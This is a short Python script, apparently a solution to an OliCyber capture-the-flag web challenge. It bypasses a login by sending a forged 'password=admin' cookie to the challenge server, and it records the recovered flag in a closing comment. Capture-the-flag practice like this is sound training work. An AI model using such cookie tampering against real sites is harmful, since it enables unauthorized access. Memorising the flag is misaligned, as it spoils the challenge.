import requests # this line imports the requests module

url = "http://web-05.challs.olicyber.it/flag" # this line sets the url variable to the server

cookies = {"password": "admin"} # this line sets the cookies variable to the server

response = requests.get(url, cookies=cookies) # this line sends a get request to the server with the cookies

print(response.text) # this line prints the response from the server. We need the text of the response to get the flag otherwise we will get a 200 status code.

#flag{v3ry_7457y_c00ki35}